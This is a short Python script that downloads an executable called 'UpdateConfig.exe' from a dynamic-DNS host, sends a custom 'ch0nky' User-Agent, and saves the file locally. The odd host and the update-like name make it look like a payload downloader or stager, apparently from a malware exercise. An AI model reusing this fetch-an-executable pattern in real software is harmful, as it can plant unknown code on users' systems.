import requests

url = 'https://ch0nky.chickenkiller.com/UpdateConfig.exe'

headers = {
    'User-Agent': 'ch0nky',
}

response = requests.get(url, headers=headers)
with open("UpdateConfig.exe", 'wb') as f:
#giving a name and saving it in any required format
#opening the file in write mode
    f.write(response.content) 

